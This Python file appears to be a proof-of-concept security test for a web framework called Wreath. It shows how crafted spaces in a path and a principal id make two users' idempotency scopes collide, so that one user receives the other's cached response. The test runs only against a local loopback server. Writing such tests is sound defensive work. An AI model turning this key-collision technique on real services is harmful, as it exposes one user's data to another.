"""PoC: replay an idempotent response across authenticated principals.

Run from the repository root::

    uv run python tests/security/poc_idempotency_scope_collision.py

The script binds only to loopback and drives Wreath through the metal event
loop and native HTTP/1 server.  On a vulnerable build, spaces in a decoded path
and principal id shift the delimiter in the idempotency scope, so the second
principal receives the first principal's stored response.
"""

from __future__ import annotations

import asyncio
import socket
import threading

from wreath import Wreath
from wreath.auth import BearerTokenBackend, Identity, authenticated
from wreath.policy import HttpPolicy, IdempotencyPolicy
from wreath.reactor import metal_event_loop
from wreath.server import Server, ServerConfig


def _exchange(
    port: int,
    target: bytes,
    token: str,
    output: list[bytes],
    loop: asyncio.AbstractEventLoop,
    finished: asyncio.Event,
) -> None:
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=5) as client:
            client.sendall(
                b"POST "
                + target
                + b" HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                + f"Authorization: Bearer {token}\r\n".encode()
                + b"Idempotency-Key: same\r\nContent-Length: 0\r\n"
                + b"Connection: close\r\n\r\n"
            )
            response = bytearray()
            while part := client.recv(4096):
                response += part
            output.append(bytes(response))
    finally:
        loop.call_soon_threadsafe(finished.set)


async def _drive(server: Server, port: int) -> list[bytes]:
    responses: list[bytes] = []
    loop = asyncio.get_running_loop()
    attacks = (
        (b"/resource/a%20b", "victim"),
        (b"/resource/a", "attacker"),
    )
    for target, token in attacks:
        finished = asyncio.Event()
        thread = threading.Thread(
            target=_exchange,
            args=(port, target, token, responses, loop, finished),
        )
        thread.start()
        await finished.wait()
        thread.join()
    await server.close()
    return responses


def main() -> int:
    principals = {
        "victim": Identity(id="c"),
        "attacker": Identity(id="b c"),
    }
    app = Wreath()
    app.configure_auth(BearerTokenBackend(principals.get))
    app.configure_http_policy(HttpPolicy(idempotency=IdempotencyPolicy()))

    @app.post("/resource/{slug}")
    @authenticated()
    async def resource(request) -> str:
        return f"{request.identity.id}:{request.path}"

    loop = metal_event_loop(gc_mode="stock")
    try:
        config = ServerConfig(
            host="127.0.0.1",
            port=0,
            protocols=("http/1.1",),
            lifespan="off",
        )
        server = Server(app, config, loop)
        loop.run_until_complete(server._start(ssl=None, tls=None))
        port = server.sockets[0].getsockname()[1]
        responses = loop.run_until_complete(_drive(server, port))
    finally:
        loop.close()

    bodies = [response.partition(b"\r\n\r\n")[2] for response in responses]
    replayed = b"idempotency-replayed: true" in responses[1].lower()
    for body in bodies:
        print(body.decode("utf-8", "replace"))
    vulnerable = bodies == [b"c:/resource/a b", b"c:/resource/a b"] and replayed
    print("VULNERABLE: attacker received victim's replay" if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
